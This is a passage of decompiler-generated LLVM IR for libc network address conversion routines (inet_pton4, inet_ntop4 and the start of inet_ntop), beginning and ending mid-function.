  br i1 %tmp63, label %dec_label_pc_805d9cd, label %dec_label_pc_805da36

dec_label_pc_805d996:                             ; preds = %dec_label_pc_805d996.outer, %dec_label_pc_805d924
  %v0_805d999 = phi i32 [ %v1_805d8ea, %dec_label_pc_805d924 ], [ %v0_805d99937, %dec_label_pc_805d996.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_805d924, %dec_label_pc_805d924 ], [ %stack_var_-44.1.ph, %dec_label_pc_805d996.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_805d928, %dec_label_pc_805d924 ], [ %stack_var_-36.1.ph, %dec_label_pc_805d996.outer ]
  %v1_805d999 = inttoptr i32 %v0_805d999 to i8*
  %v2_805d999 = load i8, i8* %v1_805d999, align 1
  %v3_805d999 = sext i8 %v2_805d999 to i32
  store i32 %v3_805d999, i32* %eax.global-to-local, align 4
  %v2_805d99d = call i32 @__GI_tolower(i32 %v3_805d999)
  store i32 %v2_805d99d, i32* %eax.global-to-local, align 4
  store i32 %v2_805d99d, i32* @esi, align 4
  %v1_805d9a7 = icmp eq i32 %v2_805d99d, 0
  %v1_805d9a9 = icmp eq i1 %v1_805d9a7, false
  br i1 %v1_805d9a9, label %dec_label_pc_805d8dd, label %dec_label_pc_805d9af

dec_label_pc_805d9af:                             ; preds = %dec_label_pc_805d996
  %v0_805da05.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_805d912, label %dec_label_pc_805d9cd, label %dec_label_pc_805d9b6

dec_label_pc_805d9b6:                             ; preds = %dec_label_pc_805d9af
  %v1_805d9b6 = add i32 %v0_805da05.pre.pre, 2
  store i32 %v1_805d9b6, i32* @edx, align 4
  %v6_805d9bd = icmp ugt i32 %v1_805d9b6, %v2_805d8b6
  br i1 %v6_805d9bd, label %dec_label_pc_805da36, label %dec_label_pc_805d9bf

dec_label_pc_805d9bf:                             ; preds = %dec_label_pc_805d9b6
  %v0_805d9bf = load i32, i32* @ebp, align 4
  %v2_805d9c1 = udiv i32 %v0_805d9bf, 256
  %v4_805d9c1 = trunc i32 %v2_805d9c1 to i8
  %v3_805d9c4 = inttoptr i32 %v0_805da05.pre.pre to i8*
  store i8 %v4_805d9c1, i8* %v3_805d9c4, align 1
  %v0_805d9c6 = load i32, i32* @ebp, align 4
  store i32 %v0_805d9c6, i32* %eax.global-to-local, align 4
  %v1_805d9c8 = trunc i32 %v0_805d9c6 to i8
  %v2_805d9c8 = load i32, i32* @ebx, align 4
  %v3_805d9c8 = add i32 %v2_805d9c8, 1
  %v4_805d9c8 = inttoptr i32 %v3_805d9c8 to i8*
  store i8 %v1_805d9c8, i8* %v4_805d9c8, align 1
  %v0_805d9cb = load i32, i32* @edx, align 4
  br label %dec_label_pc_805d9cd

dec_label_pc_805d9cd:                             ; preds = %dec_label_pc_805d9af, %dec_label_pc_805d978, %dec_label_pc_805d9bf
  %v0_805da05.pre = phi i32 [ %v0_805d983, %dec_label_pc_805d978 ], [ %v0_805d9cb, %dec_label_pc_805d9bf ], [ %v0_805da05.pre.pre, %dec_label_pc_805d9af ]
  %v4_805d9cd = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_805d9cd = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_805d9cd, label %dec_label_pc_805da05, label %dec_label_pc_805d9d4

dec_label_pc_805d9d4:                             ; preds = %dec_label_pc_805d9cd
  store i32 1, i32* @esi, align 4
  %v6_805d9db = sub i32 %v0_805da05.pre, %v4_805d9cd
  store i32 %v6_805d9db, i32* @edi, align 4
  %v16_805d9df = icmp eq i32 %v0_805da05.pre, %v2_805d8b6
  %v1_805d9e3 = icmp eq i1 %v16_805d9df, false
  br i1 %v1_805d9e3, label %dec_label_pc_805d9fd.preheader, label %dec_label_pc_805da36

dec_label_pc_805d9fd.preheader:                   ; preds = %dec_label_pc_805d9d4
  %v3_805d9fd92 = inttoptr i32 %v6_805d9db to i8*
  %v9_805d9ff100 = icmp slt i8* %v3_805d9fd92, inttoptr (i32 1 to i8*)
  br i1 %v9_805d9ff100, label %dec_label_pc_805da01, label %dec_label_pc_805d9e7

dec_label_pc_805d9e7:                             ; preds = %dec_label_pc_805d9fd.preheader, %dec_label_pc_805d9e7
  %v0_805d9f5102 = phi i32 [ %v0_805d9fd.pre, %dec_label_pc_805d9e7 ], [ 1, %dec_label_pc_805d9fd.preheader ]
  %v0_805d9e7101 = phi i32 [ %v1_805d9fd.pre, %dec_label_pc_805d9e7 ], [ %v6_805d9db, %dec_label_pc_805d9fd.preheader ]
  %v2_805d9ed = sub i32 %v0_805d9e7101, %v0_805d9f5102
  %v2_805d9ef = sub i32 %v2_805d8b6, %v0_805d9f5102
  store i32 %v2_805d9ef, i32* @ecx, align 4
  %v6_805d9f1 = add i32 %v2_805d9ed, %v4_805d9cd
  store i32 %v6_805d9f1, i32* %eax.global-to-local, align 4
  %v1_805d9f5 = add i32 %v0_805d9f5102, 1
  store i32 %v1_805d9f5, i32* @esi, align 4
  %v1_805d9f6 = inttoptr i32 %v6_805d9f1 to i8*
  %v2_805d9f6 = load i8, i8* %v1_805d9f6, align 1
  %v3_805d9f6 = zext i8 %v2_805d9f6 to i32
  %v4_805d9f6 = load i32, i32* @edx, align 4
  %v5_805d9f6 = and i32 %v4_805d9f6, -256
  %v6_805d9f6 = or i32 %v5_805d9f6, %v3_805d9f6
  store i32 %v6_805d9f6, i32* @edx, align 4
  %v3_805d9f8 = inttoptr i32 %v2_805d9ef to i8*
  store i8 %v2_805d9f6, i8* %v3_805d9f8, align 1
  %v0_805d9fa = load i32, i32* %eax.global-to-local, align 4
  %v1_805d9fa = inttoptr i32 %v0_805d9fa to i8*
  store i8 0, i8* %v1_805d9fa, align 1
  %v0_805d9fd.pre = load i32, i32* @esi, align 4
  %v1_805d9fd.pre = load i32, i32* @edi, align 4
  %v2_805d9fd = inttoptr i32 %v0_805d9fd.pre to i8*
  %v3_805d9fd = inttoptr i32 %v1_805d9fd.pre to i8*
  %v9_805d9ff = icmp sgt i8* %v2_805d9fd, %v3_805d9fd
  br i1 %v9_805d9ff, label %dec_label_pc_805da01, label %dec_label_pc_805d9e7

dec_label_pc_805da01:                             ; preds = %dec_label_pc_805d9e7, %dec_label_pc_805d9fd.preheader
  br label %dec_label_pc_805da05

dec_label_pc_805da05:                             ; preds = %dec_label_pc_805d9cd, %dec_label_pc_805da01
  %v0_805da05 = phi i32 [ %v2_805d8b6, %dec_label_pc_805da01 ], [ %v0_805da05.pre, %dec_label_pc_805d9cd ]
  %v16_805da05 = icmp eq i32 %v0_805da05, %v2_805d8b6
  %v1_805da09 = icmp eq i1 %v16_805da05, false
  br i1 %v1_805da09, label %dec_label_pc_805da36, label %dec_label_pc_805da0b

dec_label_pc_805da0b:                             ; preds = %dec_label_pc_805da05
  store i32 %v2_805d8aa, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_805da17 = call i32 @memcpy(i16* %tmp64, i32 %v2_805d8aa, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805da38

dec_label_pc_805da26:                             ; preds = %dec_label_pc_805d88a
  %v1_805da26 = call i32 @__errno_location(i32 %v0_805d879)
  %v1_805da2b = inttoptr i32 %v1_805da26 to i32*
  store i32 97, i32* %v1_805da2b, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805da38

dec_label_pc_805da36:                             ; preds = %dec_label_pc_805d937, %dec_label_pc_805d92e, %dec_label_pc_805d8f2, %dec_label_pc_805d919, %dec_label_pc_805d9d4, %dec_label_pc_805d978, %dec_label_pc_805da05, %dec_label_pc_805d9b6, %dec_label_pc_805d96b, %dec_label_pc_805d962, %dec_label_pc_805d8c5
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805da38

dec_label_pc_805da38:                             ; preds = %dec_label_pc_805da26, %dec_label_pc_805da0b, %dec_label_pc_805d895, %dec_label_pc_805da36
  %v0_805da3f = phi i32 [ -1, %dec_label_pc_805da26 ], [ 1, %dec_label_pc_805da0b ], [ %v3_805d89b, %dec_label_pc_805d895 ], [ 0, %dec_label_pc_805da36 ]
  store i32 %v0_805d879, i32* @ebx, align 4
  store i32 %v0_805d878, i32* @esi, align 4
  store i32 %v0_805d877, i32* @edi, align 4
  store i32 %v0_805d876, i32* @ebp, align 4
  ret i32 %v0_805da3f

; uselistorder directives
  uselistorder i32 %v1_805d9fd.pre, { 1, 0 }
  uselistorder i32 %v0_805d9fd.pre, { 1, 0 }
  uselistorder i32 %v0_805d9f5102, { 2, 1, 0 }
  uselistorder i32 %v0_805da05.pre, { 2, 0, 1 }
  uselistorder i32 %v0_805da05.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_805d99d, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_805d8ea, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_805d8b6, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_805d879, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805da38, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805da36, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_805da05, { 1, 0 }
  uselistorder label %dec_label_pc_805d9e7, { 1, 0 }
  uselistorder label %dec_label_pc_805d9cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d996, { 1, 0 }
  uselistorder label %dec_label_pc_805d956, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805d996.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_805da41 = load i32, i32* @edi, align 4
  %v0_805da42 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_805da4a = load i32, i32* @eax, align 4
  %v3_805da4e = and i32 %v0_805da4a, -65536
  store i32 %v3_805da4e, i32* %stack_var_-33, align 4
  %v2_805da59 = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805da5f = load i32, i32* @edx, align 4
  %v5_805da5f = inttoptr i32 %v0_805da5f to i8*
  store i8* %v5_805da5f, i8** %stack_var_-60, align 4
  %v0_805da63 = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_805da69 = add i32 %v2_805da59, 4
  store i32 %v6_805da69, i32* %edi.global-to-local, align 4
  %v2_805da6a = inttoptr i32 %v6_805da69 to i32*
  store i32 0, i32* %v2_805da6a, align 4
  %v3_805da6a = load i32, i32* %edi.global-to-local, align 4
  %v6_805da6a = add i32 %v3_805da6a, 4
  store i32 %v6_805da6a, i32* %edi.global-to-local, align 4
  %v0_805da6b = load i32, i32* %eax.global-to-local, align 4
  %v2_805da6b = inttoptr i32 %v6_805da6a to i32*
  store i32 %v0_805da6b, i32* %v2_805da6b, align 4
  %v3_805da6b = load i32, i32* %edi.global-to-local, align 4
  %v6_805da6b = add i32 %v3_805da6b, 4
  store i32 %v6_805da6b, i32* %edi.global-to-local, align 4
  %v0_805da6c = load i32, i32* %eax.global-to-local, align 4
  %v1_805da6c = trunc i32 %v0_805da6c to i16
  %v3_805da6c = inttoptr i32 %v6_805da6b to i16*
  store i16 %v1_805da6c, i16* %v3_805da6c, align 2
  %v4_805da6c = load i32, i32* %edi.global-to-local, align 4
  %v7_805da6c = add i32 %v4_805da6c, 2
  store i32 %v7_805da6c, i32* %edi.global-to-local, align 4
  %v0_805da6e = load i32, i32* %eax.global-to-local, align 4
  %v1_805da6e = trunc i32 %v0_805da6e to i8
  %v3_805da6e = inttoptr i32 %v7_805da6c to i8*
  store i8 %v1_805da6e, i8* %v3_805da6e, align 1
  %v0_805dafe26 = load i32, i32* %ebp.global-to-local, align 4
  %v7_805db0132 = icmp sgt i32 %v0_805dafe26, 3
  br i1 %v7_805db0132, label %dec_label_pc_805db07, label %dec_label_pc_805da74

dec_label_pc_805da74:                             ; preds = %entry, %dec_label_pc_805dadc
  %v0_805dafe33 = phi i32 [ %v0_805dafe, %dec_label_pc_805dadc ], [ %v0_805dafe26, %entry ]
  %v0_805da78 = load i32, i32* @ecx, align 4
  %v1_805da78 = and i32 %v0_805da78, -256
  %v2_805da78 = or i32 %v1_805da78, 100
  store i32 %v2_805da78, i32* %ecx.global-to-local, align 4
  %v2_805da7a = add i32 %v0_805dafe33, %v0_805da4a
  store i32 %v2_805da7a, i32* %eax.global-to-local, align 4
  %v0_805da7c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805da7c = add i32 %v0_805da7c, 1
  store i32 %v1_805da7c, i32* @esi, align 4
  store i32 %v0_805da7c, i32* @edi, align 4
  %v1_805da85 = inttoptr i32 %v2_805da7a to i8*
  %v2_805da85 = load i8, i8* %v1_805da85, align 1
  %v3_805da85 = zext i8 %v2_805da85 to i32
  %v4_805da85 = load i32, i32* @edx, align 4
  %v5_805da85 = and i32 %v4_805da85, -65536
  %v6_805da85 = or i32 %v5_805da85, %v3_805da85
  store i32 %v6_805da85, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_805da85, 100
  %v6_805da8b = zext i8 %div to i32
  %v4_805da8d = or i32 %v6_805da8b, %v1_805da78
  store i32 %v4_805da8d, i32* %ecx.global-to-local, align 4
  %v1_805da8f = or i32 %v4_805da8d, 48
  store i32 %v1_805da8f, i32* %eax.global-to-local, align 4
  %v1_805da92 = trunc i32 %v1_805da8f to i8
  %v2_805da92 = load i32, i32* @esp, align 4
  %v4_805da92 = add i32 %v0_805da7c, 43
  %v5_805da92 = add i32 %v4_805da92, %v2_805da92
  %v6_805da92 = inttoptr i32 %v5_805da92 to i8*
  store i8 %v1_805da92, i8* %v6_805da92, align 1
  %v0_805da96 = load i32, i32* %eax.global-to-local, align 4
  %v1_805da96 = trunc i32 %v0_805da96 to i8
  %v7_805da96 = icmp eq i8 %v1_805da96, 48
  %v1_805da98 = icmp eq i1 %v7_805da96, false
  %v0_805dabe = load i32, i32* %ecx.global-to-local, align 4
  %v1_805dabe = and i32 %v0_805dabe, -256
  %v2_805dabe = or i32 %v1_805dabe, 10
  store i32 %v2_805dabe, i32* %ecx.global-to-local, align 4
  %v0_805dac0 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805dac0, i32* %eax.global-to-local, align 4
  %v3_805dac2 = trunc i32 %v0_805dac0 to i16
  %v5_805dac2 = udiv i16 %v3_805dac2, 10
  br i1 %v1_805da98, label %dec_label_pc_805dabe, label %dec_label_pc_805da9a

dec_label_pc_805da9a:                             ; preds = %dec_label_pc_805da74
  %v9_805da9e = and i32 %v0_805dac0, -65536
  %tmp = urem i16 %v5_805dac2, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div34 = udiv i16 %tmp, 10
  %v7_805daab = zext i16 %div34 to i32
  %v11_805daab = or i32 %v7_805daab, %v9_805da9e
  store i32 %v11_805daab, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp, 10
  %v12_805daab = zext i16 %tmp36 to i32
  %v1_805daae = or i32 %v12_805daab, 48
  %v8_805daae = trunc i32 %v1_805daae to i8
  store i32 %v1_805daae, i32* %edx.global-to-local, align 4
  %v2_805dab1 = load i32, i32* @esp, align 4
  %v3_805dab1 = load i32, i32* %ebx.global-to-local, align 4
  %v4_805dab1 = add i32 %v2_805dab1, 43
  %v5_805dab1 = add i32 %v4_805dab1, %v3_805dab1
  %v6_805dab1 = inttoptr i32 %v5_805dab1 to i8*
  store i8 %v8_805daae, i8* %v6_805dab1, align 1
  %v0_805dab5 = load i32, i32* %edx.global-to-local, align 4
  %v1_805dab5 = trunc i32 %v0_805dab5 to i8
  %v7_805dab5 = icmp eq i8 %v1_805dab5, 48
  br i1 %v7_805dab5, label %dec_label_pc_805dadc, label %dec_label_pc_805daba

dec_label_pc_805daba:                             ; preds = %dec_label_pc_805da9a
  %v0_805daba = load i32, i32* @esi, align 4
  store i32 %v0_805daba, i32* @edi, align 4
  br label %dec_label_pc_805dadc

dec_label_pc_805dabe:                             ; preds = %dec_label_pc_805da74
  %tmp37 = urem i16 %v5_805dac2, 256
  %v3_805dac4 = and i32 %v0_805dac0, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div35 = udiv i16 %tmp37, 10
  %v7_805dacf = zext i16 %div35 to i32
  %v11_805dacf = or i32 %v7_805dacf, %v3_805dac4
  store i32 %v11_805dacf, i32* %eax.global-to-local, align 4
  %tmp38 = urem i16 %tmp37, 10
  %v12_805dacf = zext i16 %tmp38 to i32
  %v1_805dad2 = or i32 %v12_805dacf, 48
  %v8_805dad2 = trunc i32 %v1_805dad2 to i8
  store i32 %v1_805dad2, i32* %edx.global-to-local, align 4
  %v0_805dad5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805dad5 = add i32 %v0_805dad5, 2
  store i32 %v1_805dad5, i32* @edi, align 4
  %v2_805dad8 = load i32, i32* @esp, align 4
  %v3_805dad8 = load i32, i32* @esi, align 4
  %v4_805dad8 = add i32 %v2_805dad8, 43
  %v5_805dad8 = add i32 %v4_805dad8, %v3_805dad8
  %v6_805dad8 = inttoptr i32 %v5_805dad8 to i8*
  store i8 %v8_805dad2, i8* %v6_805dad8, align 1
  br label %dec_label_pc_805dadc

dec_label_pc_805dadc:                             ; preds = %dec_label_pc_805da9a, %dec_label_pc_805daba, %dec_label_pc_805dabe
  store i32 %v2_805da7a, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_805dae5 = load i32, i32* @edi, align 4
  %v1_805dae5 = add i32 %v0_805dae5, 2
  store i32 %v1_805dae5, i32* %ebx.global-to-local, align 4
  %v0_805dae8 = load i32, i32* %ebp.global-to-local, align 4
  %v1_805dae8 = add i32 %v0_805dae8, 1
  store i32 %v1_805dae8, i32* %ebp.global-to-local, align 4
  %v2_805dae9 = load i8, i8* %v1_805da85, align 1
  %v3_805dae9 = zext i8 %v2_805dae9 to i32
  %v4_805dae9 = load i32, i32* %eax.global-to-local, align 4
  %v5_805dae9 = and i32 %v4_805dae9, -65536
  %v6_805dae9 = or i32 %v5_805dae9, %v3_805dae9
  store i32 %v6_805dae9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_805daef = load i32, i32* @esp, align 4
  %v2_805daef = add i32 %v0_805dae5, 44
  %v3_805daef = add i32 %v2_805daef, %v0_805daef
  %v4_805daef = inttoptr i32 %v3_805daef to i8*
  store i8 46, i8* %v4_805daef, align 1
  %v0_805daf4 = load i32, i32* @ecx, align 4
  %v1_805daf4 = load i32, i32* %eax.global-to-local, align 4
  %v2_805daf4 = urem i32 %v1_805daf4, 65536
  %v3_805daf4 = load i32, i32* %edx.global-to-local, align 4
  %v4_805daf4 = mul i32 %v3_805daf4, 65536
  %v5_805daf4 = or i32 %v4_805daf4, %v2_805daf4
  %v6_805daf4 = urem i32 %v0_805daf4, 65536
  %v7_805daf4 = udiv i32 %v5_805daf4, %v6_805daf4
  %v8_805daf4 = urem i32 %v7_805daf4, 65536
  %v10_805daf4 = and i32 %v1_805daf4, -65536
  %v11_805daf4 = or i32 %v8_805daf4, %v10_805daf4
  store i32 %v11_805daf4, i32* %eax.global-to-local, align 4
  %v12_805daf4 = urem i32 %v5_805daf4, %v6_805daf4
  %v14_805daf4 = and i32 %v3_805daf4, -65536
  %v15_805daf4 = or i32 %v12_805daf4, %v14_805daf4
  %v1_805daf7 = add i32 %v15_805daf4, 48
  %v8_805daf7 = trunc i32 %v1_805daf7 to i8
  store i32 %v1_805daf7, i32* @edx, align 4
  %v2_805dafa = load i32, i32* @esp, align 4
  %v3_805dafa = load i32, i32* @edi, align 4
  %v4_805dafa = add i32 %v2_805dafa, 43
  %v5_805dafa = add i32 %v4_805dafa, %v3_805dafa
  %v6_805dafa = inttoptr i32 %v5_805dafa to i8*
  store i8 %v8_805daf7, i8* %v6_805dafa, align 1
  %v0_805dafe = load i32, i32* %ebp.global-to-local, align 4
  %v7_805db01 = icmp sgt i32 %v0_805dafe, 3
  br i1 %v7_805db01, label %dec_label_pc_805db07, label %dec_label_pc_805da74

dec_label_pc_805db07:                             ; preds = %dec_label_pc_805dadc, %entry
  %v0_805db07 = load i32, i32* @esp, align 4
  %v1_805db07 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805db07 = add i32 %v0_805db07, 42
  %v3_805db07 = add i32 %v2_805db07, %v1_805db07
  %v4_805db07 = inttoptr i32 %v3_805db07 to i8*
  store i8 0, i8* %v4_805db07, align 1
  %v2_805db0f = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_805db0f, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_805db14 = call i32 @strlen(i8* %tmp23)
  store i32 %v3_805db14, i32* @eax, align 4
  %tmp39 = icmp ugt i32 %v3_805db14, %v0_805da63
  br i1 %tmp39, label %dec_label_pc_805db22, label %dec_label_pc_805db31

dec_label_pc_805db22:                             ; preds = %dec_label_pc_805db07
  %v0_805db22 = load i8*, i8** %stack_var_-92, align 4
  %v1_805db22 = ptrtoint i8* %v0_805db22 to i32
  %v2_805db22 = call i32 @__errno_location(i32 %v1_805db22)
  %v1_805db27 = inttoptr i32 %v2_805db22 to i32*
  store i32 28, i32* %v1_805db27, align 4
  br label %dec_label_pc_805db40

dec_label_pc_805db31:                             ; preds = %dec_label_pc_805db07
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_805db345 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_805db345, i32* %tmp25, align 4
  %v0_805db38.cast = inttoptr i32 %v3_805db345 to i8*
  %v4_805db38 = call i32 @strcpy(i8* %v0_805db38.cast, i32 %v2_805db0f)
  br label %dec_label_pc_805db40

dec_label_pc_805db40:                             ; preds = %dec_label_pc_805db22, %dec_label_pc_805db31
  %storemerge = phi i32 [ %v4_805db38, %dec_label_pc_805db31 ], [ 0, %dec_label_pc_805db22 ]
  %v0_805db47 = phi i32 [ %v4_805db38, %dec_label_pc_805db31 ], [ 0, %dec_label_pc_805db22 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805da42, i32* @esi, align 4
  store i32 %v0_805da41, i32* @edi, align 4
  ret i32 %v0_805db47

; uselistorder directives
  uselistorder i32 %v0_805dafe, { 1, 0 }
  uselistorder i32 %v3_805daf4, { 1, 0 }
  uselistorder i32 %v1_805daf4, { 1, 0 }
  uselistorder i32 %v1_805dad2, { 1, 0 }
  uselistorder i32 %v1_805daae, { 1, 0 }
  uselistorder i32 %v0_805dac0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805da8f, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i8 100, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805db40, { 1, 0 }
  uselistorder label %dec_label_pc_805dadc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805da74, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_805db48 = load i32, i32* @ebp, align 4
  %v0_805db49 = load i32, i32* @edi, align 4
  %v0_805db4a = load i32, i32* @esi, align 4
  %v0_805db4b = load i32, i32* @ebx, align 4
  %v15_805db4c = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_805db53 = icmp eq i32 %arg1, 2
  br i1 %v9_805db53, label %dec_label_pc_805db63, label %dec_label_pc_805db58

dec_label_pc_805db58:                             ; preds = %entry
  %v9_805db58 = icmp eq i32 %arg1, 10
  %v1_805db5b = icmp eq i1 %v9_805db58, false
  br i1 %v1_805db5b, label %dec_label_pc_805dcff, label %dec_label_pc_805db7b

dec_label_pc_805db63:                             ; preds = %entry
  %v4_805db63 = ptrtoint i8* %arg3 to i32
  store i32 %v4_805db63, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_805db6f = call i32 @inet_ntop4(i32 %v0_805db4b, i32 %v0_805db4a, i32 %v0_805db49)
  store i32 %v3_805db6f, i32* %eax.global-to-local, align 4
  store i32 %v3_805db6f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805dd0c

dec_label_pc_805db7b:                             ; preds = %dec_label_pc_805db58
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_805db80 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805db80, i32* %eax.global-to-local, align 4
  %tmp44 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp44, i8** %stack_var_-124, align 4
  %v6_805db85 = call i32 @__GI_memset(i8* %tmp44, i32 0, i32 32)
  store i32 %v6_805db85, i32* %eax.global-to-local, align 4
  %v2_805dba7 = add i32 %arg2, 1
  br label %dec_label_pc_805db91

dec_label_pc_805db91:                             ; preds = %dec_label_pc_805db91.dec_label_pc_805db91_crit_edge, %dec_label_pc_805db7b
  %v1_805dbb4 = phi i32 [ %v15_805db4c, %dec_label_pc_805db7b ], [ %v1_805dbb4.pre, %dec_label_pc_805db91.dec_label_pc_805db91_crit_edge ]
  %v0_805dbaf70 = phi i32 [ 0, %dec_label_pc_805db7b ], [ %v0_805dbb8.pre, %dec_label_pc_805db91.dec_label_pc_805db91_crit_edge ]
  %v1_805db9a = ashr i32 %v0_805dbaf70, 31
  %v2_805db9b = zext i32 %v0_805dbaf70 to i64
  %v4_805db9b = zext i32 %v1_805db9a to i64
  %v5_805db9b = mul nuw i64 %v4_805db9b, 4294967296
  %v6_805db9b = or i64 %v5_805db9b, %v2_805db9b
  %v8_805db9b = sdiv i64 %v6_805db9b, 2
  %v9_805db9b = trunc i64 %v8_805db9b to i32
  store i32 %v9_805db9b, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_805db9b, i32* %ebx.global-to-local, align 4
  %v2_805dba3 = add i32 %v0_805dbaf70, %arg2
  %v3_805dba3 = inttoptr i32 %v2_805dba3 to i8*
  %v4_805dba3 = load i8, i8* %v3_805dba3, align 1
  %v5_805dba3 = zext i8 %v4_805dba3 to i32
  store i32 %v5_805dba3, i32* %eax.global-to-local, align 4
  %v3_805dba7 = add i32 %v2_805dba7, %v0_805dbaf70
  %v4_805dba7 = inttoptr i32 %v3_805dba7 to i8*
  %v5_805dba7 = load i8, i8* %v4_805dba7, align 1
  %v6_805dba7 = zext i8 %v5_805dba7 to i32
  store i32 %v6_805dba7, i32* %edx.global-to-local, align 4
  %v2_805dbac = mul nuw nsw i32 %v5_805dba3, 256
  %v1_805dbaf = add i32 %v0_805dbaf70, 2
  store i32 %v1_805dbaf, i32* @ecx, align 4
  %v2_805dbb2 = or i32 %v6_805dba7, %v2_805dbac
  store i32 %v2_805dbb2, i32* %eax.global-to-local, align 4
  %v3_805dbb4 = mul i32 %v9_805db9b, 4
  %v4_805dbb4 = add i32 %v3_805dbb4, 60
  %v5_805dbb4 = add i32 %v4_805dbb4, %v1_805dbb4
  %v6_805dbb4 = inttoptr i32 %v5_805dbb4 to i32*
  store i32 %v2_805dbb2, i32* %v6_805dbb4, align 4
  %v0_805dbb8.pre = load i32, i32* @ecx, align 4
  %v7_805dbbb = icmp sgt i32 %v0_805dbb8.pre, 15
  br i1 %v7_805dbbb, label %dec_label_pc_805dbbd, label %dec_label_pc_805db91.dec_label_pc_805db91_crit_edge

dec_label_pc_805db91.dec_label_pc_805db91_crit_edge: ; preds = %dec_label_pc_805db91
  %v1_805dbb4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805db91

dec_label_pc_805dbbd:                             ; preds = %dec_label_pc_805db91
